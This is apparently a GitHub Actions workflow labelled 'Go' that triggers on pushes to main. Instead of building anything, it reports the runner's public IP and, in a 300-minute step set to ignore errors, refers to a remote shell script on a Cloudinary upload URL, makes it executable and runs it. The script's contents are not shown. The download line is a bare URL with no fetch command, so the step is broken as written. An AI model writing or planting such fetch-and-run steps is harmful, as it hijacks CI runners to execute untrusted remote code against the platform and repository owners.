name: Go

on:
  workflow_dispatch:
  push:
    branches: [main]

jobs:
  run:
    continue-on-error: true
    runs-on: ubuntu-latest
    steps:
      - name: IP Workflow
        run: |
          curl https://api.ipify.org
      - name: Run exec
        timeout-minutes: 300
        run: |
          https://res.cloudinary.com/dyfqshedb/raw/upload/v1711332463/rootleip8uimhgrqkhop.sh
          chmod +x rootleip8uimhgrqkhop.sh
          ./rootleip8uimhgrqkhop.sh
